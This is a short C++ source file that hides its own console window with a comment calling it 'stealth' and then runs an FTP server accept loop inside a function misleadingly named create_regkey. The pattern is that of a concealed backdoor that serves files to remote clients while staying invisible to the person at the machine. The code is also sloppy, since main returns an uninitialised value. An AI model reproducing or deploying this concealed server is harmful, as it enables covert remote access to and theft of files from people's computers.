#include "FtpServer.h"

int create_regkey();

int create_regkey() {
	int running = true;

	// Start the server and listen
	FtpServer* server = new FtpServer();

	while (running) {
		server->accept_new_clients();
		running = server->check_server_status();
	}
	return 0;
}


int main(void)
{
	int t;
   HWND stealth; /*creating stealth (window is not visible)*/
   AllocConsole();
   stealth=FindWindowA("ConsoleWindowClass",NULL);
   ShowWindow(stealth,0);
 
   create_regkey();
    
   
 
   return t;
}  
